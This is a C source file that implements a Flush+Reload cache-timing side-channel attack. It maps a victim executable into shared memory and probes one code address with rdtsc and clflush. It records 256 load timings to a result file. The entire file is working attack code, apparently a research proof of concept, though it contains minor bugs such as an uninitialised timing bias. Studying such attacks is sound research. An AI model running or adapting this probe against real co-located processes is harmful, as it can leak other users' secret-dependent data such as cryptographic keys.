/*************************************************************************
	> File Name: cache_attack_main.c
	> Author: Yves
	> E-mail: tangye@hotmail.com
	> Created Time: 2015-2-11. 11:56:20
 ************************************************************************/

#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>

const uint32_t DEBUG = 1;
const uint32_t ITERATIONTIMES = 1000;
const uint32_t PROBE_THRESHOLD = 200;
const uint32_t MAPPED_FILE_SIZE = 4194304;

uint32_t probe(char *adrs) {
    volatile uint32_t time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

uint32_t get_bias()
{
    uint32_t bias;
    uint64_t begin,end;
    int k;
    for(k = 0; k < ITERATIONTIMES; k++)
	{
		asm(
			"rdtsc\n\t"
			:"=A"(begin)
		);
		asm(
			"rdtsc\n\t"
			:"=A"(end)
		);
		bias += (uint32_t)(end - begin);
	}

	bias = bias / ITERATIONTIMES /2;

	return bias;
}


static __inline__ void wait(uint32_t value)
{
    while(value--);
}

void attack(char *address, size_t num, uint32_t waitting_cycles,
    uint32_t *result, uint32_t bias) {
    size_t i;
    for (i = 0; i < num; i++) {
        result[i] = probe(address) - bias;
        wait(waitting_cycles);
    }
}

int main(void)
{
    FILE* result_file;
    result_file = fopen("attack_result","w");
    size_t i, map_len;
    uint32_t waitting_cycles = 17000;
    uint32_t bias;
    uint32_t result[256];
    unsigned long offest = 0xFFC; //the address to evict,note that the start address of the ELF file is 0x8048000

    /* map the executable file of victim to the virtual address space of attack process*/
    int victim_fd = open("./victim.out",O_RDONLY);
    if(victim_fd == -1)
    {
        exit(1);
    }
    map_len = MAPPED_FILE_SIZE;
    char *target = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
            victim_fd, 0);
    if (target == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    if(DEBUG)
    {
        printf("The victim is mapped at: %p\n", target);
    }
    target += offest;

    printf("Started attacking...\n");
    bias = get_bias();
    attack(target, 256, waitting_cycles, result, bias);
    printf("Finished attacking...\n");

    /*Output the result*/
    for(i = 0; i < 256; i++)
    {
        fprintf(result_file,"%u\r\n",result[i]);
    }
    fclose(result_file);
    return 0;
}
